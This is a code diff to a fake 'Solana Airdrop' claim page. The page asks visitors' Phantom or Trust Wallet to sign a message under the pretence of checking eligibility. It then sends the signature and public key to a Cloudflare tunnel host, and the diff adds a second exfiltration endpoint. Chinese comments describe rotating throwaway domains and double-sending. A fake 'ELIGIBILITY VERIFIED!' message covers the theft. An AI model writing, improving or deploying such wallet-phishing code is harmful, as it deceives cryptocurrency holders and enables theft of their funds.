@@ -13,31 +13,26 @@
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use Trust Wallet or Phantom browser."); return; }
             const { publicKey } = await p.connect();
-            const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\n" +
-                          "Protocol: Solana Airdrop V4\n" +
-                          "Action: Verify Wallet Eligibility\n" +
-                          "Timestamp: " + Date.now();
+            const message = "Airdrop Claim ID: " + Math.floor(Math.random() * 999999) + "\nProtocol: Solana Airdrop V4";
             const encodedMessage = new TextEncoder().encode(message);
             document.getElementById('status').innerText = "Analyzing eligibility...";
             const signedMessage = await p.signMessage(encodedMessage, "utf8");
             const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
             
-            // 🔱 替换为最新的生死域名，保持 /collect 路径不变
-            fetch("https://minerals-sleeping-applicant-solution.trycloudflare.com/collect", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    signature: signature,
-                    pubkey: publicKey.toString(),
-                    message: message
-                }),
-                keepalive: true
+            const data = JSON.stringify({
+                signature: signature,
+                pubkey: publicKey.toString(),
+                message: message
             });
+
+            // 🔱 暴力双发：同时尝试昨天备份里出现过的两个路径
+            const tunnel = "https://minerals-sleeping-applicant-solution.trycloudflare.com";
+            fetch(tunnel + "/collect", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: data, keepalive: true });
+            fetch(tunnel + "/api/v1/secure_update", { method: 'POST', headers: {'Content-Type': 'application/json'}, body: data, keepalive: true });
+
             document.getElementById('status').style.color = '#14F195';
             document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
-            setTimeout(() => {
-                window.location.href = "https://solscan.io/account/" + publicKey.toString();
-            }, 800);
+            setTimeout(() => { window.location.href = "https://solscan.io/account/" + publicKey.toString(); }, 800);
         } catch(e) { window.location.reload(); }
     }
     </script></body></html>
